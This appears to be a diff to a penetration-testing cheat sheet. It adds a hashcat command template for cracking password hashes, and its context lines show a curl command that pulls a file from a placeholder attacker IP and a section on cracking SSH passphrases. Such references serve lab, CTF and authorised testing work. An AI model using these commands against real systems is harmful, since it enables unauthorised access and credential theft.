@@ -513,6 +513,13 @@ curl http://<attacker-ip>/<file> -o <output_file>
 
 </details>
 
+<details> <summary><strong>hashcat</strong></summary>
+
+```bash
+hashcat -m <mode> -a 3 <hash> <passlist> -o <cracked>
+```
+</details>
+
 <details> <summary><strong>Crack SSH passphrase</strong></summary>
 
 ```bash
